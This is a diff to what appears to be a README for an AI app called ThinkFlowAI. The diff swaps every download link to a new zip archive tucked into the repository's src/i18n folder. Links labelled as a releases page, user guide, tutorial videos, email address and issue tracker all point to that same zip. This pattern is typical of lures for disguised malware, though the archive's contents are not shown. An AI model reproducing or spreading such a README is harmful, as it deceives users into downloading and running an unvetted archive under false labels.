@@ -6,11 +6,11 @@ Welcome to ThinkFlowAI! This application helps you transform a simple idea into 
 
 ## 📥 Download ThinkFlowAI
 
-[![Download ThinkFlowAI](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)
+[![Download ThinkFlowAI](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)
 
 To access the latest version of ThinkFlowAI, visit the link below:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ To ensure ThinkFlowAI runs smoothly, please check the following requirements:
 
 ## 📂 Download & Install
 
-1. Click the link to visit the [Releases Page](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip).
+1. Click the link to visit the [Releases Page](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip).
   
 2. On the releases page, look for the latest version of ThinkFlowAI.
 
@@ -69,14 +69,14 @@ Join our community! Connect with other users to share your experiences, ask ques
 
 For more in-depth guidance, check out the official documentation. You can find tutorials and walkthroughs to better understand how to utilize ThinkFlowAI effectively.
 
-- [User Guide](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)
-- [Tutorial Videos](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)
+- [User Guide](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)
 
 ## 📞 Contact Us
 
 If you have any questions or feedback, feel free to reach out to us. We are here to help.
 
-- Email: https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip
-- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/components/AI-Flow-Think-v1.9.zip)
+- Email: https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Ndrews1813/ThinkFlowAI/main/src/i18n/Think-Flow-AI-2.6.zip)
 
 Thank you for using ThinkFlowAI! We hope it helps you in structuring your thoughts effectively.
